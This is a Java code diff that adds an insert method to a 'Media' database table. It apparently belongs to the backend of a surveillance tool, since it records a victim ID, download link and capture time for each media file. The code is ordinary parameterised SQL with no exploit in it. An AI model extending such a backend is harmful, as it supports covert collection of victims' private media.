@@ -9,8 +9,6 @@ import org.json.JSONObject;
 
 import java.sql.PreparedStatement;
 import java.sql.SQLException;
-import java.util.ArrayList;
-import java.util.List;
 
 /**
  * Created by theapache64 on 9/10/16.
@@ -29,6 +27,46 @@ public class Media extends BaseTable<MediaNode> {
 
     public static Media getInstance() {
         return instance;
+    }
+
+
+    @Override
+    public boolean add(MediaNode mediaNode) {
+
+        boolean isAdded = false;
+        final String query = "INSERT INTO media (victim_id, name, _type,server_id, download_link, file_size_in_kb, captured_at) VALUES (?,?,?,?,?,?,?);";
+        final java.sql.Connection con = Connection.getConnection();
+
+        try {
+            final PreparedStatement ps = con.prepareStatement(query);
+
+
+            ps.setString(1, mediaNode.getVictimId());
+            ps.setString(2, mediaNode.getName());
+            ps.setString(3, mediaNode.getType());
+            ps.setString(4, mediaNode.getServerId());
+            ps.setString(5, mediaNode.getDownloadLink());
+            ps.setLong(6, mediaNode.getFileSizeInKb());
+            ps.setLong(7, mediaNode.getCapturedAt());
+
+            isAdded = ps.executeUpdate() == 1;
+
+            if (!isAdded) {
+                throw new IllegalArgumentException("Failed to add media node :" + mediaNode.getName());
+            }
+
+
+        } catch (SQLException e) {
+            e.printStackTrace();
+        } finally {
+            try {
+                con.close();
+            } catch (SQLException e) {
+                e.printStackTrace();
+            }
+        }
+
+        return isAdded;
     }
 
     @Override
